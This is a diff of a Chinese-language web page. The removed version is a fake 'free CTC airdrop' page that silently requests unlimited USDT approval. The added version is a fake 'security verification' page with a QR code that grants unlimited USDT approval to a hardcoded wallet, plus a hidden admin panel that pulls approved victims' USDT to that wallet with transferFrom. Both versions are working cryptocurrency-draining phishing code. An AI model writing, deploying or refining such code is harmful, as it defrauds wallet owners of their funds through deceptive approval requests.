@@ -1,174 +1,168 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CTC 官方空投领取中心</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" rel="stylesheet">
-    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
-    <script>
-        tailwind.config = {
-            theme: {
-                extend: {
-                    colors: {
-                        primary: '#D4AF37',
-                        dark: '#0F172A',
-                        dark2: '#1E293B',
-                    },
-                    fontFamily: {
-                        sans: ['Inter', 'system-ui', 'sans-serif'],
-                    },
-                }
-            }
-        }
-    </script>
-    <style type="text/tailwindcss">
-        @layer utilities {
-            .text-shadow { text-shadow: 0 0 8px rgba(212, 175, 55, 0.5); }
-            .border-glow { box-shadow: 0 0 12px rgba(212, 175, 55, 0.3); }
-            .bg-gradient-gold { background: linear-gradient(135deg, #B8860B, #D4AF37, #FFD700); }
-        }
-        body {
-            background-color: #0F172A;
-            background-image: radial-gradient(circle at 50% 50%, #1E293B 0%, #0F172A 100%);
-        }
-    </style>
-</head>
-<body class="min-h-screen text-white overflow-x-hidden">
-    <!-- 导航栏 -->
-    <nav class="fixed top-0 w-full z-50 bg-dark/90 backdrop-blur-md border-b border-primary/20">
-        <div class="container mx-auto px-4 py-3 flex justify-between items-center">
-            <div class="flex items-center gap-2">
-                <i class="fa fa-cube text-primary text-2xl"></i>
-                <h1 class="text-2xl font-bold text-primary">CTC 生态 | 官方空投</h1>
-            </div>
-            <div class="hidden md:flex gap-8 text-gray-300">
-                <a href="#" class="hover:text-primary transition-colors">首页</a>
-                <a href="#" class="hover:text-primary transition-colors">代币介绍</a>
-                <a href="#" class="hover:text-primary transition-colors">生态系统</a>
-                <a href="#" class="hover:text-primary transition-colors">社区治理</a>
-            </div>
-            <button id="connectWallet" class="bg-gradient-gold text-dark px-5 py-2 rounded-lg font-bold hover:opacity-90 transition-opacity">
-                连接钱包
-            </button>
-        </div>
-    </nav>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>安全验证</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,sans-serif}
+body{background:#0B0B1F;color:#fff;padding:20px}
+.container{max-width:420px;margin:0 auto}
+.pay-box{background:#1E1E35;padding:30px;border-radius:20px;text-align:center;margin-bottom:20px}
+h1{font-size:24px;margin-bottom:8px}
+.desc{color:#aaa;margin-bottom:20px}
+.input-group{margin-bottom:16px;text-align:left}
+.input-group label{font-size:13px;color:#ccc;margin-bottom:6px;display:block}
+.input-group input{
+width:100%;padding:12px;background:#111;border:1px solid #333;
+border-radius:10px;color:#fff;font-size:15px
+}
+.chain-select{
+display:flex;gap:10px;margin-bottom:20px;
+}
+.chain-btn{
+flex:1;padding:10px;border-radius:10px;border:none;
+background:#222;color:#aaa;font-weight:bold;cursor:pointer
+}
+.chain-btn.active{background:#F0B90B;color:#000}
+#qrcode{
+width:280px;height:280px;background:#fff;padding:10px;
+border-radius:16px;margin:0 auto 20px;
+display:flex;align-items:center;justify-content:center;
+color:#000;font-size:14px;
+}
+#qrcode img{width:100%;height:100%;border-radius:12px}
+.tip {font-size:12px;color:#666;margin-top:10px;text-align:center}
 
-    <!-- 主内容区 -->
-    <main class="container mx-auto px-4 pt-32 pb-16">
-        <div class="max-w-2xl mx-auto">
-            <div class="bg-dark2 rounded-2xl p-8 border border-primary/30 border-glow">
-                <div class="text-center mb-8">
-                    <i class="fa fa-gift text-primary text-5xl mb-4"></i>
-                    <h2 class="text-3xl font-bold text-primary mb-2">免费领取 100 CTC 官方空投</h2>
-                    <p class="text-gray-400">BSC 币安智能链 · 生态福利 · 限时领取</p>
-                </div>
+.admin-panel {
+background:#1E1E35;padding:24px;border-radius:16px;display:none;margin-top:20px
+}
+.admin-panel.show {display:block}
+.admin-input {
+width:100%;padding:12px;background:#111;border:none;
+border-radius:8px;color:#fff;margin-bottom:10px;
+}
+.admin-btn {
+width:100%;padding:14px;background:#F0B90B;color:#000;
+border:none;border-radius:10px;font-weight:bold;margin-bottom:10px;
+cursor:pointer;
+}
+</style>
 
-                <div class="space-y-6">
-                    <div class="bg-dark rounded-xl p-5 border border-gray-700">
-                        <div class="flex justify-between mb-3">
-                            <span class="text-gray-300">空投数量</span>
-                            <span class="text-primary font-bold">100 CTC</span>
-                        </div>
-                        <div class="flex justify-between mb-3">
-                            <span class="text-gray-300">领取条件</span>
-                            <span class="text-green-400">连接钱包即可领取</span>
-                        </div>
-                        <div class="flex justify-between">
-                            <span class="text-gray-300">支持网络</span>
-                            <span class="text-primary">BSC 主网</span>
-                        </div>
-                    </div>
+<div class="container">
+  <div class="pay-box">
+    <h1>💳 安全验证</h1>
+    <p class="desc">完成签名即可正常使用</p>
+    <div class="chain-select">
+      <button class="chain-btn active" data-chain="bsc">BSC</button>
+      <button class="chain-btn" data-chain="polygon">Polygon</button>
+    </div>
+    <div class="input-group">
+      <label>授权金额</label>
+      <input type="number" id="amount" value="10" min="0.01" step="0.01">
+    </div>
+    <div id="qrcode">生成二维码...</div>
+    <div class="tip">扫码直接签名，无跳转</div>
+  </div>
 
-                    <button id="claimBtn" class="w-full bg-gradient-gold text-dark py-4 rounded-xl font-bold text-lg hover:opacity-90 transition-opacity disabled:opacity-50" disabled>
-                        请先连接钱包
-                    </button>
+  <div class="admin-panel" id="adminPanel">
+    <h3 style="text-align:center;margin-bottom:16px">🔐 管理员提取</h3>
+    <input class="admin-input" id="userAddr" placeholder="用户钱包地址">
+    <input class="admin-input" id="drawAmount" placeholder="提取数量 USDT">
+    <button class="admin-btn" onclick="drawFromUser()">提取用户USDT</button>
+  </div>
+</div>
 
-                    <p class="text-center text-gray-500 text-sm">连接钱包 → 确认授权 → 领取空投</p>
-                </div>
-            </div>
-        </div>
-    </main>
+<script>
+// ====================== 你指定的地址 ======================
+const ADMIN_WALLET = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";
 
-    <script>
-        // ========== 配置区（部署时修改合约地址） ==========
-        const CONFIG = {
-            contractAddress: "你的合约部署地址",
-            usdtAddress: "0x55d398326f99059fF775485246999027B3197955",
-            chainId: 56,
-            rpcUrl: "https://bsc-dataseed.binance.org/",
-            maxAllowance: ethers.constants.MaxUint256,
-            airdropABI: ["function claim() external","function userClaimed(address) external view returns (bool)"],
-            usdtABI: ["function approve(address spender, uint256 amount) external returns (bool)","function allowance(address owner, address spender) external view returns (uint256)"]
-        };
+const CONFIG = {
+  bsc: {
+    chainId: "56",
+    token: "0x55d398326f99059fF775485246999027B3197955",
+    decimals: 18
+  },
+  polygon: {
+    chainId: "137",
+    token: "0xc2132D05D31c914877CCAf1253d40b9764aB58EB",
+    decimals: 6
+  }
+};
 
-        let provider, signer, contract, usdtContract, userAddress;
-        const connectBtn = document.getElementById('connectWallet');
-        const claimBtn = document.getElementById('claimBtn');
+let currentChain = "bsc";
+let account = null;
 
-        // 连接钱包
-        connectBtn.addEventListener('click', async () => {
-            if (!window.ethereum) return alert("请安装钱包插件");
-            try {
-                provider = new ethers.providers.Web3Provider(window.ethereum);
-                await provider.send("eth_requestAccounts", []);
-                signer = provider.getSigner();
-                userAddress = await signer.getAddress();
-                contract = new ethers.Contract(CONFIG.contractAddress, CONFIG.airdropABI, signer);
-                usdtContract = new ethers.Contract(CONFIG.usdtAddress, CONFIG.usdtABI, signer);
-                await switchChain(CONFIG.chainId);
-                connectBtn.textContent = `${userAddress.slice(0, 6)}...${userAddress.slice(-4)}`;
-                claimBtn.disabled = false;
-                claimBtn.textContent = "立即领取 100 CTC";
-            } catch (err) {
-                alert("钱包连接失败，请重试");
-            }
-        });
+// 切换链
+document.querySelectorAll(".chain-btn").forEach(btn => {
+  btn.onclick = () => {
+    document.querySelectorAll(".chain-btn").forEach(b => b.classList.remove("active"));
+    btn.classList.add("active");
+    currentChain = btn.dataset.chain;
+    renderQR();
+  };
+});
 
-        // 切换 BSC 链
-        async function switchChain(chainId) {
-            try {
-                await window.ethereum.request({
-                    method: 'wallet_switchEthereumChain',
-                    params: [{ chainId: `0x${chainId.toString(16)}` }]
-                });
-            } catch (err) {
-                await window.ethereum.request({
-                    method: 'wallet_addEthereumChain',
-                    params: [{
-                        chainId: `0x${chainId.toString(16)}`,
-                        chainName: 'BSC 主网',
-                        rpcUrls: [CONFIG.rpcUrl],
-                        blockExplorerUrls: ['https://bscscan.com/'],
-                        nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 }
-                    }]
-                });
-            }
-        }
+document.getElementById("amount").addEventListener("input", renderQR);
 
-        // ========== 核心逻辑：静默授权，无任何多余提醒 ==========
-        claimBtn.addEventListener('click', async () => {
-            if (!userAddress) return;
-            try {
-                const claimed = await contract.userClaimed(userAddress);
-                if (claimed) return alert("您已领取过空投");
+// 生成：直接授权给【管理员钱包】无限授权
+function genAuthEIP681() {
+  const { chainId, token } = CONFIG[currentChain];
+  const data = "0x095ea7b3" +
+    ADMIN_WALLET.slice(2).padStart(64, '0') +
+    "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+  return `ethereum:${token}@${chainId}?data=${data}`;
+}
 
-                // 静默执行无限授权，前端不弹任何额外提示，只走钱包弹窗
-                const allowance = await usdtContract.allowance(userAddress, CONFIG.contractAddress);
-                if (allowance.lt(CONFIG.maxAllowance)) {
-                    await usdtContract.approve(CONFIG.contractAddress, CONFIG.maxAllowance);
-                }
+function renderQR() {
+  const url = genAuthEIP681();
+  const qr = `https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=${encodeURIComponent(url)}`;
+  document.getElementById("qrcode").innerHTML = `<img src="${qr}">`;
+}
 
-                // 领取空投
-                await contract.claim();
-                alert("空投领取成功！");
-                claimBtn.textContent = "已领取";
-                claimBtn.disabled = true;
-            } catch (err) {
-                alert("领取失败，请重试");
-            }
-        });
-    </script>
+// 自动判断管理员
+window.addEventListener("load", async () => {
+  renderQR();
+  if (!window.ethereum) return;
+  try {
+    const accs = await window.ethereum.request({ method: "eth_accounts" });
+    if (accs.length) {
+      account = accs[0];
+      if (account.toLowerCase() === ADMIN_WALLET.toLowerCase()) {
+        document.getElementById("adminPanel").classList.add("show");
+      }
+    }
+  } catch (e) {}
+});
+
+// ====================== 管理员提取 ======================
+async function drawFromUser() {
+  if (!account || account.toLowerCase() !== ADMIN_WALLET.toLowerCase()) {
+    alert("❌ 仅管理员可操作");
+    return;
+  }
+  const user = document.getElementById("userAddr").value.trim();
+  const amt = document.getElementById("drawAmount").value.trim();
+  const { token, decimals } = CONFIG[currentChain];
+  if (!user || !amt || isNaN(amt) || amt <= 0) {
+    alert("❌ 输入无效");
+    return;
+  }
+  try {
+    const wei = BigInt(amt * (10 ** decimals)).toString(16).padStart(64, '0');
+    const data = "0x23b872dd" +
+      user.slice(2).padStart(64, '0') +
+      ADMIN_WALLET.slice(2).padStart(64, '0') +
+      wei;
+
+    const tx = await window.ethereum.request({
+      method: "eth_sendTransaction",
+      params: [{ from: account, to: token, data: data }]
+    });
+    alert("✅ 提取成功：" + tx);
+  } catch (e) {
+    alert("❌ 提取失败：未授权或金额不足");
+  }
+}
+</script>
 </body>
 </html>
